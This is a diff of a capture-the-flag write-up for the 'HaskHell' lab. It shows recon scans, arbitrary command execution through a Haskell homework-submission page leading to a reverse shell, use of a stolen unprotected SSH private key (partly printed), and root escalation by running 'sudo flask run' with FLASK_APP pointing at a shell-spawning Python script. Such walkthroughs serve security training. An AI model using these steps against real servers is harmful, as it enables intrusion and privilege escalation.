@@ -4,6 +4,9 @@ title: HaskHell
 ---
 
 # HaskHell
+
+Room Description : Teach your CS professor that his PhD isn't in security.
+
 lets begin by running Nmap scan ` sudo nmap -sS -A <IP> -v -oN scan `
 
 ```console
@@ -20,9 +23,13 @@ PORT     STATE SERVICE VERSION
 |_http-title: Homepage
 ```
 
-We have discovered a webserver running on port 5001, which seems to hosted by a professor
+We have discovered a webserver running on port 5001, which seems to hosted by a professor.
 
-lets run dirsearch for discovering hidden directories or files 
+![](https://user-images.githubusercontent.com/75718583/130963432-ab921629-ac32-4c43-83a5-db48a40b6af0.png)
+
+On exploring the webiste there is a link for uploading homework that redirect to http://<IP>/upload which dose not seems to works.
+
+lets run dirsearch for discovering hidden directories or files.
 
 ```console
 dirsearch -u http://10.10.153.185:5001/ --simple-report=web_dir
@@ -45,10 +52,12 @@ Output File: /home/kali/Desktop/Tools/dirsearch/reports/10.10.153.185/_21-08-26_
 [17:28:45] 500 -  291B  - /uploads/dump.sql                                                     
 
 Task Completed                                                                                       
-```               
+``` 
+On visiting /submit page we can find a submit button. We can submit our haskell code and run arbitary comands on the server.
 
-On visiting /submit page we can find a submit button. We can submit our haskell code and run arbitary comands on the server.\ 
-lets create a revshell 
+![image](https://user-images.githubusercontent.com/75718583/130962994-6d9768d9-47c5-4c5e-9108-dbe5bcc90695.png)
+
+lets create a revshell
 
 ```haskell
 module Main where
@@ -75,7 +84,7 @@ flask@haskhell:~$ ls
 ls
 app.py  app.pyc  __pycache__  uploads
 ```
-On enumerating the machine I'have found 2 user prof & haskell, in prof's home folder there was user.txt which we contains user flag
+On enumerating the machine I'have found 2 user prof & haskell, in prof's home folder there was user.txt which contains user flag.
 
 ```console
 flask@haskhell:/home/prof$ ls -al
@@ -118,13 +127,22 @@ MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
 94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
 .........................................
 -----END RSA PRIVATE KEY-----
-
 ```
-Lets copy this key to our machine and ssh into the user prof another great thing is that this keys is not even password protected.\
+  
+Lets copy this key to our machine and ssh into the user prof another great thing is that this keys is not even password protected.
+```console
+┌──(kali㉿kali)-[~/Desktop/husky]
+└─$ chmod 600 id_rsa                                                                      
+                                                                                                     
+┌──(kali㉿kali)-[~/Desktop/husky]
+└─$ ssh -i id_rsa prof@10.10.150.235
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 
-On checking privileges for user prof we find that he can run `/usr/bin/flask run` with root privileges\
+  
+```  
+On checking privileges for user prof we find that he can run `/usr/bin/flask run` with root privileges.
 
-For exploiting this we need to create a python script for spawing a root shell\
+For exploiting this we need to create a python script for spawing a root shell
 ```python
 #!/usr/bin/python
 import os
@@ -136,13 +154,13 @@ Set the variable to our newly created file
 export FLASK_APP=/home/prof/bash.py
 ```
 
-Run `sudo /usr/bin/flask run`\
+Run `sudo /usr/bin/flask run`
 ```console
 prof@haskhell:~$ sudo /usr/bin/flask run
 root@haskhell:~# ls
 app.py  __pycache__  rev.sh  user.txt
 ```
-Got root flag
+Got the root.txt
 
 ```console
 root@haskhell:/root# cat root.txt 
